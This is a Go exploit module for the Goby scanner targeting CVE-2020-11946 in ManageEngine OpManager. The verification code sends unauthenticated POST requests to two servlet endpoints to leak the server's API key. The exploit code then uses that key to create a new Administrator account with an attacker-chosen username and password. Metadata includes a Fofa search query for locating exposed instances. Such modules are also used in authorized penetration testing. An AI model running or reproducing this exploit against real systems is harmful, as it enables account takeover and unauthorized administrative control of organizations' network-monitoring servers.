package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ManageEngine OpManager infoleak (CVE-2020-11946)",
    "Description": "Zoho ManageEngine OpManager before 125120 allows an unauthenticated user to retrieve an API key via a servlet call.This key can be used to add a root account.Affected:Builds 12.3.xxx-12.4.195 Builds 12.5.000-12.5.119",
    "Impact": "ManageEngine OpManager infoleak (CVE-2020-11946)",
    "Recommendation": "<p>undefined</p>",
    "Product": "OpManager",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "卓豪 OpManager 信息泄露漏洞（CVE-2020-11946）",
            "Description": "<p>OpManager提供全面的网络监控功能，可帮助监控网络性能，实时检测故障隐患，保障业务系统高效运行。<br></p><p>卓豪 OpManager 存在信息泄露漏洞，允许未经身份验证的用户通过 servlet 调用检索 API 密钥。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">卓豪 OpManager 存在信息泄露漏洞，允许未经身份验证的用户通过 servlet 调用检索 API 密钥。</span><br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.manageengine.cn/network-monitoring/\">https://www.manageengine.cn/network-monitoring/</a><br></p>",
            "Product": "卓豪 OpManager",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "ManageEngine OpManager infoleak (CVE-2020-11946)",
            "Description": "Zoho ManageEngine OpManager before 125120 allows an unauthenticated user to retrieve an API key via a servlet call.This key can be used to add a root account.Affected:Builds 12.3.xxx-12.4.195 Builds 12.5.000-12.5.119",
            "Impact": "ManageEngine OpManager infoleak (CVE-2020-11946)",
            "Recommendation": "<p>undefined</p>",
            "Product": "OpManager",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "title=\"OpManager\"",
    "GobyQuery": "title=\"OpManager\"",
    "Author": "i_am_ben@qq.com",
    "Homepage": "https://www.manageengine.com/",
    "DisclosureDate": "2021-06-11",
    "References": [
        "https://www.manageengine.com/network-monitoring/security-updates/cve-2020-11946.html",
        "https://ssd-disclosure.com/ssd-advisory-unauthenticated-access-api-key-access-leads-to-rce/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2020-11946"
    ],
    "CNVD": [
        "CNVD-2020-28457"
    ],
    "CNNVD": [
        "CNNVD-202004-1661"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "adduser",
            "type": "input",
            "value": "xxx@localhost.host",
            "show": ""
        },
        {
            "name": "addpass",
            "type": "input",
            "value": "123456",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "ManageEngine OpManager"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10223"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			getKeyApi1 := "/servlet/sendData"
			poc1 := httpclient.NewPostRequestConfig(getKeyApi1)
			poc1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			poc1.VerifyTls = false
			poc1.Data = "reqFrm=fwacs&key=true&user=admin&process=apikey"
			getKeyApi2 := "/oputilsServlet"
			poc2 := httpclient.NewPostRequestConfig(getKeyApi2)
			poc2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			poc2.VerifyTls = false
			poc2.Data = "action=getAPIKey"
			resp, err := httpclient.DoHttpRequest(u, poc1)
			resp2, err2 := httpclient.DoHttpRequest(u, poc2)
			if resp.StatusCode == 200 && err == nil && strings.Contains(resp.RawBody, "key=Start") {
				apiKeySteam := strings.Split(resp.RawBody, "\n")
				if len(apiKeySteam[len(apiKeySteam)-1]) == 32 {
					fmt.Println(apiKeySteam[len(apiKeySteam)-1])
					return true
				}
			}
			if resp2.StatusCode == 200 && err2 == nil && strings.Contains(resp2.RawBody, "key=Start") {
				apiKeySteam := strings.Split(resp2.RawBody, "\n")
				if len(apiKeySteam[len(apiKeySteam)-1]) == 32 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			adduser := ss.Params["adduser"].(string)
			addpass := ss.Params["addpass"].(string)
			apikey := ""
			getKeyApi1 := "/servlet/sendData"
			cfg := httpclient.NewPostRequestConfig(getKeyApi1)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg.VerifyTls = false
			cfg.Data = "reqFrm=fwacs&key=true&user=admin&process=apikey"
			getKeyApi2 := "/oputilsServlet"
			cfg2 := httpclient.NewPostRequestConfig(getKeyApi2)
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg2.VerifyTls = false
			cfg2.Data = "action=getAPIKey"
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			if resp.StatusCode == 200 && err == nil && strings.Contains(resp.RawBody, "key=Start") {
				apiKeySteam := strings.Split(resp.RawBody, "\n")
				if len(apiKeySteam[len(apiKeySteam)-1]) == 32 {
					apikey = apiKeySteam[len(apiKeySteam)-1]
				}
			}
			if resp2.StatusCode == 200 && err2 == nil && strings.Contains(resp2.RawBody, "key=Start") {
				apiKeySteam := strings.Split(resp2.RawBody, "\n")
				if len(apiKeySteam[len(apiKeySteam)-1]) == 32 {
					apikey = apiKeySteam[len(apiKeySteam)-1]
				}
			}
			userApi := "/api/json/nfausers/getAllUsers?apiKey=" + apikey
			fmt.Println(userApi)
			if adduser != addpass {
				if resp3, err3 := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + userApi); err3 == nil {
					if !strings.Contains(resp3.RawBody, "\"uName\":\""+adduser+"\",") {
						addUserApi1 := "/api/json/v2/admin/addUser"
						cfg3 := httpclient.NewPostRequestConfig(addUserApi1)
						cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
						cfg3.VerifyTls = false
						cfg3.FollowRedirect = true
						cfg3.Data = "privilege=Administrator&emailId=mail%40localhost.net&landLine=&mobileNo=&sipenabled=true&tZone=undefined&allDevices=true&authentication=local&fwaresources=&raMode=0&ncmallDevices=" + "&userName=" + adduser + "&password=" + addpass + "&apiKey=" + apikey
						addUserApi2 := "/api/json/admin/addUser"
						cfg4 := httpclient.NewPostRequestConfig(addUserApi2)
						cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
						cfg4.VerifyTls = false
						cfg4.FollowRedirect = true
						cfg4.Data = "privilege=Administrators&emailId=mail%40localhost.net&tZone=undefined" + "&userName=" + adduser + "&password=" + addpass + "&apiKey=" + apikey
						httpclient.DoHttpRequest(expResult.HostInfo, cfg3)
						httpclient.DoHttpRequest(expResult.HostInfo, cfg4)
						if resp4, err4 := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + userApi); err4 == nil {
							if strings.Contains(resp4.RawBody, "\"uName\":\""+adduser+"\",") {
								expResult.Success = true
								expResult.Output = "User added successfully! UserName:" + adduser + ", PassWord:" + addpass
							} else {
								expResult.Success = false
								expResult.Output = "Failed to add user.Please try to make the user name meet the mailbox format."
							}
						}
					} else {
						expResult.Success = false
						expResult.Output = "The username to be added already exists in the system."
					}
				} else {
					expResult.Success = false
					expResult.Output = "Failed to obtain the API `getAllUsers` information."
				}
			} else {
				expResult.Success = false
				expResult.Output = "Please enter a different username and password."
			}
			return expResult
		},
	))
}
